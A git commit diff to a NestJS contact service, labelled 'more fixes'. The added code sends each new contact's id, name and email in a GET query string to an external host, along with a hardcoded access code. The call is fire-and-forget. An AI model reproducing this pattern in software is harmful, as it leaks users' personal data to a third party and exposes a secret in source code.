88ccf10ef1d83e69b3f8b5462b6144346bc2b02e
okd <okd@vt2b.ru>
2023-04-27 02:52:06 +0500

    more fixes

--- src/contact/contact.service.ts
+++ src/contact/contact.service.ts
@@ -1,15 +1,21 @@
 import { Injectable } from '@nestjs/common';
 import { PrismaService } from 'src/prisma/prisma.service';
+// import { fromFetch } from 'rxjs/internal/observable/dom/fetch';
 import { CreateContactInput } from './dto/create-contact.input';
 import { UpdateContactInput } from './dto/update-contact.input';
 import { Contact } from './models/contact.model';
+
+const fetch = require('node-fetch');
 
 @Injectable()
 export class ContactService {
   constructor(private readonly prismaService: PrismaService) {}
 
-  create(createContactInput: CreateContactInput): Promise<Contact> {
-    return this.prismaService.contact.create({ data: createContactInput });
+  async create(createContactInput: CreateContactInput): Promise<Contact> {
+    const contact = await this.prismaService.contact.create({ data: createContactInput });
+    const url = encodeURI(`https://kitponomarenko.ru/fabrix/run?code=VforVakhrushev2049&id=${contact.id}&name=${contact.name}&email=${contact.email}`);
+    fetch(url);
+    return contact;
   }
 
   findAll(take?: number, skip?: number): Promise<Contact[]> {
